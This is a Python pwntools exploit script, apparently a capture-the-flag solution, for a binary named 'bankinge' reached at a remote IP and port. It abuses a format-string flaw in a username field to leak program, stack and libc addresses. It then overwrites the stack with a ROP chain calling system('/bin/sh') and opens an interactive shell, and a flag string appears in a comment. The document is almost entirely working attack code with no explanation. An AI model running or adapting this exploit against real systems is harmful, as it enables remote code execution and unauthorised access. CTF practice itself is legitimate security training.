#!/usr/bin/env python3
import pwn

exe = pwn.ELF("./bankinge")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")
# pwn.context.log_level='debug'
pwn.context.terminal = ["foot"]
# p = pwn.process(exe.path)
# p = pwn.gdb.debug([exe.path],"""
#                   b*info+23
#                   # b*main+84
#
#                 """)
if pwn.args.REMOTE:
    p = pwn.remote("103.163.24.78", 10002)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
def read(idx):
    sla(b">",b"2")
    sla(b"name:",b"admin")
    sla(b"sword:",b"admin")
    sla(b"name:",f"lmao%{idx}$p".encode())
    sla(b">",b"1")
    sla(b"name:",b"admin")
    sla(b"sword:",b"admin")
    sla(b">",b"3")

def write(byte,idx):
    sla(b">",b"2")
    sla(b"name:",b"admin")
    sla(b"sword:",b"admin")
    sla(b"name:",f"%{byte}c%{idx}$hn".encode())
    sla(b">",b"1")
    sla(b"name:",b"admin")
    sla(b"sword:",b"admin")
    sla(b">",b"3")
    sla(b">",b"4")
    sla(b"leave a feedback:",b"abcd")
def writes(target,addr):
    target = target & 0xffff
    pwn.log.info(f"target: {hex(target)}")
    write(target,35)
    addr = addr & 0xffff
    write(addr,85)
def writess(target,addr):
    writes(target,addr)
    pwn.log.info(f"write first time")
    writes(target+2,addr>>16)
    pwn.log.info(f"write second time")
    writes(target+4,addr>>32)
    pwn.log.info(f"write third time")

def writex(byte,idx):
    pwn.log.info(f"byte: {hex(byte)}")
    sla(b">",b"2")
    sla(b"name:",b"admin")
    sla(b"sword:",b"admin")
    sla(b"name:",f"%{byte}c%{idx}$hn".encode())
    sla(b">",b"1")
    sla(b"name:",b"admin")
    sla(b"sword:",b"admin")
    sla(b">",b"3")
    sla(b">",b"4")
    sla(b"leave a feedback:",b"abcd")
def writesx(target,addr):
    # pwn.log.info(b"stop........")
    # pwn.gdb.attach(p)
    target = target & 0xffff
    pwn.log.info(f"target: {hex(target)}")
    writex(target,35)
    addr = addr & 0xffff
    writex(addr,79)
def writessx(target,addr):
    writesx(target,addr)
    writesx(target+2,addr>>16)
    writesx(target+4,addr>>32)
    
if __name__ == "__main__":
    # p = conn()
    read(7)
    p.recvuntil(b"lmao")
    addr = int(p.recv(14),16)
    origin = addr-140
    base = addr - 6102
    main_part = base + 0x1870
    printf = base + 16296
    pop_rsi = base + 0x0000000000001911
    pop_rdi = base + 0x0000000000001913
    pwn.log.info(f"addr: {hex(addr)}")
    pwn.log.info(f"addr base: {hex(base)}")
    pwn.log.info(f"main part: {hex(main_part)}")
    sla(b">",b"4")
    sla(b"leave a feedback:",b"abcd")
    read(6)
    p.recvuntil(b"lmao")
    stack = int(p.recv(14),16)
    rbp2 = stack + 0x20
    target = stack+40
    targetnext = stack-125736
    ret_next = stack -125720
    fucs = stack + 328
    puts = base + 0x3f90
    pwn.log.info(f"stack: {hex(stack)}")
    pwn.log.info(f"target: {hex(target)}")
    pwn.log.info(f"target next: {hex(targetnext)}")
    pwn.log.info(f"ret next: {hex(ret_next)}")
    pwn.log.info(f"fucs: {hex(fucs)}")
    sla(b">",b"4")
    sla(b"leave a feedback:",b"abcd")
    pwn.log.info(f"pop rdi: {hex(pop_rdi)}")
    writess(rbp2,targetnext)
    writess(target,pop_rdi)
    writess(target+8,printf)
    writess(target+16,main_part)
    sla(b"> ",b"3")
    leak_libc = pwn.u64(p.recv(6).ljust(8,b"\x00"))
    pwn.log.info(f"leak libc: {hex(leak_libc)}")
    base_libc = leak_libc - libc.symbols["printf"]
    bin_sh = base_libc + next(libc.search(b"/bin/sh"))
    system_libc = base_libc + libc.symbols["system"]
    pwn.log.info(f"base libc: {hex(base_libc)}")
    pwn.log.info(f"bin_sh: {hex(bin_sh)}")
    pwn.log.info(f"system_libc: {hex(system_libc)}")
    pwn.log.info(f"origin: {hex(origin)}")
    # pwn.gdb.attach(p,gdbscript='''
    #
    #              b*info+23
    #               # b*main+84
    #
    #                ''')
    middle = ret_next >> 16 & 0xffff
    pwn.log.info(f"middle: {hex(middle)}")
    fixaddr = fucs+2 & 0xffff
    write(fixaddr,36)
    write(middle,77)
    writessx(ret_next-0x8,pop_rdi)
    writessx(ret_next,bin_sh)
    writessx(ret_next+0x8,system_libc)
    # KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}







    # good luck pwning :)
    p.interactive()
